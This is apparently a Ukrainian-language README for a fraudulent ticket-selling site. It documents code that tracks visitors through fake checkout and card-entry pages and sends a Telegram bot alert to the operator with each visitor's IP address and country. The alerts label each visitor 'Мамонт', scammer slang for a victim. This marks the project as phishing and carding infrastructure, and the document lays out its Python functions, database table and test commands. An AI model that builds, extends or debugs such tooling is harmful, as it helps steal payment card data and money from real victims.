# 🔔 Логування сторінок введення карт - Повна документація

## 📋 Огляд

Система автоматично логує всі переходи користувачів на сторінки введення карт та надсилає повідомлення адміністраторам в особисті повідомлення з ботом.

## 🎯 Основна функціональність

### 1. **Сторінка введення карти** (`/buy-tickets/loading/`)
- **Російська назва**: "Ввод карты" 
- **Спеціальне логування**: ✅ Так
- **Формат повідомлення**: Спеціальний формат з російською назвою

### 2. **Інші сторінки оформлення**
- **Сторінка коду**: `/buy-tickets/code/` → "Оформление заказа (код)"
- **Сторінка кількості**: `/buy-tickets/quantity/` → "Оформление заказа (количество)"
- **Сторінка оплати**: `/buy-tickets/payment/` → "Оформление заказа (оплата)"
- **Стандартне логування**: ✅ Так

## 📱 Формат повідомлення

### Для сторінки "Ввод карты":
```
🔔Мамонт открыл страницу (Ввод карты)

📎Страница: Ввод карты
#️⃣Ссылка: ?page=2-37
📶IP: 37.52.215.105
🌎Страна: UA
```

### Для інших сторінок:
```
🔔Мамонт открыл страницу (Оформление заказа)

📎Страница: Оформление заказа
#️⃣Ссылка: ?page=2-37
📶IP: 37.52.215.105
🌎Страна: UA
```

## 🔧 Технічна реалізація

### 1. **Визначення назви сторінки**

#### В `main.py`:
```python
def get_page_name_from_url(url_path, page_code=None):
    if '/buy-tickets/' in url_path:
        if '/loading/' in url_path:
            return "Ввод карты"  # ← Спеціальна обробка
        elif '/code/' in url_path:
            return "Оформлення замовлення (код)"
        # ... інші сторінки
```

#### В `server.py`:
```python
def get_page_name(path):
    if '/buy-tickets/' in path:
        if '/loading/' in path:
            return "Ввод карты"  # ← Спеціальна обробка
        elif '/code/' in path:
            return "Оформление заказа (код)"
        # ... інші сторінки
```

### 2. **Логування активності**

#### В `main.py`:
```python
def log_user_activity(page_code, user_ip, page_url, action_type="page_view", user_agent=None, referer=None):
    # Логує в базу даних
    # Надсилає повідомлення адміністратору
    send_activity_notification_to_admin(page_code, user_ip, user_country, page_name, page_url, action_type)
```

#### В `server.py`:
```python
def send_personal_log_to_admin(page_code, ip, country, page_name, action_type="page_view"):
    # Надсилає повідомлення в особисті повідомлення з ботом
    # Використовує Telegram API
```

### 3. **Надсилання повідомлень**

#### Через бота (main.py):
```python
def send_activity_notification_to_admin(page_code, user_ip, user_country, page_name, page_url, action_type):
    # Формує повідомлення
    message = f"""🔔Мамонт открыл страницу ({page_name})
    
📎Страница: {page_name}
#️⃣Ссылка: ?page={page_code}
📶IP: {user_ip}
🌎Страна: {user_country}"""
    
    # Надсилає через бота
    asyncio.create_task(bot.send_message(admin_id, message))
```

#### Через Telegram API (server.py):
```python
def send_personal_log_to_admin(page_code, ip, country, page_name, action_type="page_view"):
    # Формує повідомлення
    message = f"""🔔Мамонт открыл страницу ({page_name})
    
📎Страница: {page_name}
#️⃣Ссылка: ?page={page_code}
📶IP: {ip}
🌎Страна: {country}"""
    
    # Надсилає через Telegram API
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": admin_id, "text": message}
    requests.post(url, data=data, timeout=2)
```

## 🗄️ База даних

### Таблиця `user_activity_logs`:
```sql
CREATE TABLE user_activity_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    page_code TEXT NOT NULL,
    user_ip TEXT NOT NULL,
    user_country TEXT,
    page_name TEXT NOT NULL,
    page_url TEXT NOT NULL,
    action_type TEXT DEFAULT 'page_view',
    user_agent TEXT,
    referer TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

### Пошук адміністратора:
1. **Спочатку** шукає в `event_links` по `event_code`
2. **Потім** шукає в `site_users` по `page_code`
3. **Якщо не знайдено** - лог не надсилається

## 🚀 Запуск та тестування

### 1. **Тест формату повідомлень**:
```bash
python3 test_card_logging_direct.py
```

### 2. **Тест всіх сторінок**:
```bash
python3 test_all_card_pages.py
```

### 3. **Тест визначення назв**:
```bash
python3 quick_test_card_logging.py
```

## ✅ Перевірка роботи

### 1. **Перевірте логи в базі даних**:
```sql
SELECT * FROM user_activity_logs 
WHERE page_name = 'Ввод карты' 
ORDER BY timestamp DESC 
LIMIT 5;
```

### 2. **Перевірте повідомлення в Telegram**:
- Адміністратор має отримати повідомлення в особисті повідомлення з ботом
- Формат має відповідати вимогам
- IP та країна мають бути коректними

### 3. **Перевірте консоль сервера**:
```
[ACTIVITY LOG] page_view | 2-37 | 37.52.215.105 | UA | Ввод карты
[INFO] Повідомлення надіслано власнику 123456789 для page_code 2-37
```

## 🔍 Відладка

### Якщо логування не працює:

1. **Перевірте підключення до бази даних**
2. **Перевірте наявність page_code в таблицях**
3. **Перевірте права доступу до Telegram API**
4. **Перевірте логи сервера на помилки**

### Типові помилки:
```
[WARNING] page_code 2-37 не знайдено в жодній таблиці
[ERROR] Failed to send message: ...
[ERROR] Failed to log user activity: ...
```

## 📝 Примітки

- **Сторінка "Ввод карты"** має спеціальне логування
- **Всі повідомлення** надсилаються в особисті повідомлення з ботом
- **Формат повідомлень** ідентичний в main.py та server.py
- **IP та країна** визначаються автоматично
- **Логування** відбувається для кожного переходу користувача
